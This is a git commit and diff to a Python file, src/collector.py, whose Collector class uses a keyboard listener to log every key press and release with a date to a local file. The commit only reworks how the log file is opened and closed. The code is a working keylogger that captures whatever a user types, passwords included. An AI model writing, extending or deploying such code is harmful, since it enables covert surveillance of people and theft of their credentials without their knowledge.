111d1a6bed7acd2d14b8fb563ed4e60624b0bdca
apostolides <thanosapostolidis@protonmail.com>
2022-12-10 06:07:15 +0200

    temporary change for bad logfile behaviour

--- src/collector.py
+++ src/collector.py
@@ -4,7 +4,7 @@ from datetime import datetime
 class Collector:
     def __init__(self, logfile = "./logfile"):
         self.logfile = logfile
-        self.logfilefd = open(self.logfile, "a")
+        self.logfilefd = None
         self.listener = None
 
     def on_press(self, key):
@@ -12,18 +12,19 @@ class Collector:
             self.inject_to_log(f"[*] Pressed: {key.char} at: {datetime.today().strftime('%Y-%m-%d')}")
         except AttributeError:
             self.inject_to_log(f"[*] Pressed: {key} at: {datetime.today().strftime('%Y-%m-%d')}")
-    
+
     def on_release(self, key):
         try:
             self.inject_to_log(f"[*] Released: {key.char} at: {datetime.today().strftime('%Y-%m-%d')}")
         except AttributeError:
             self.inject_to_log(f"[*] Released: {key} at: {datetime.today().strftime('%Y-%m-%d')}")
         if key == keyboard.Key.esc:
-            self.logfilefd.close()
             return False
     
     def inject_to_log(self, payload):
+        self.logfilefd = open(self.logfile, "a")
         self.logfilefd.write(payload + "\n")
+        self.logfilefd.close()
 
     def start(self):
         self.listener = keyboard.Listener(on_press=self.on_press,on_release=self.on_release)
